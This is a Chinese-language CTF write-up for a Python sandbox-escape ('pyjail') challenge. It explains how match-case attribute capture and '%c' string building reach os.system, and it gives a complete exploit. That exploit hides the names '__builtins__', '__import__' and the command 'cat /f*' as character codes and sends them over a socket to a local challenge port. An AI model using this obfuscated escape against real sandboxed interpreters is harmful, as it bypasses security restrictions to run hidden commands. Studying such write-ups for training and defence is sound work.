---
titleTemplate: ':title | WriteUp - NewStar CTF 2024'
---

# pyjail

`match case` 是 Python 3.10才有的语法，可以用来获取一个对象的属性

```python
class Dog:
    def __init__(self, name):
        self.name = name

def describe_pet(pet):
    match pet:
        case Dog(name=name1):
            print(name1) # 这个位置会输出 Rover，原因是 pet 对象的属性 name 被传给了 name1

pet = Dog("Rover")
describe_pet(pet)
```

`str()` 是一个空字符串对象，下面这部分等价于 `bfc = ''.join([chr(37),chr(99),])`，也就是 `bfc=%c`

```python
match str():
    case str(join=join):
        bfc = join(list((chr(37),chr(99),)))
```

后面拿到了 `%c`，就可以使用 `%` 构造字符串

完整的 EXP 如下：

```python
import socket,time
code = \
'''
bfc = None
buil = None
impo = None
os = None
system = None
cmd = None
match str():
    case str(join=join):
        bfc = join(list((chr(37),chr(99),)))
        buil = bfc*12
        buil = buil%(95,95,98,117,105,108,116,105,110,115,95,95)
        impo = bfc*10
        impo = impo%(95,95,105,109,112,111,114,116,95,95)
        system = bfc*6
        system = system%(115,121,115,116,101,109)
        os = bfc*2
        os = os%(111,115)
        cmd = bfc*7
        cmd = cmd%(99,97,116,32,47,102,42)

match vars():
    case dict(get=get):
        bui = vars(get(buil))
        match bui:
            case dict(get=get2):
                os = vars(get2(impo)(os))
                match os:
                    case dict(get=get3):
                        get3(system)(cmd)

EOF
'''

def send_messages(host, port):
    # 创建一个 TCP/IP 套接字
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # 连接到服务器
        print(f"正在连接到 {host}:{port}")
        sock.connect((host, port))

        # 要发送的消息
        messages = [
            "start",
            code,
        ]

        # 逐条发送消息
        for message in messages:
            sock.sendall(message.encode())  # 将字符串编码为字节数据
            time.sleep(2)
        response = sock.recv(1024)  # 接收来自服务器的回应
        print(f"收到回应: {response.decode()}")

    except Exception as e:
        print(f"发生错误: {e}")

    finally:
        sock.close()

if __name__ == "__main__":
    target_host = "127.0.0.1"  # 替换为你想要发送消息的主机IP
    target_port = 32808        # 替换为目标端口

    send_messages(target_host, target_port)
```
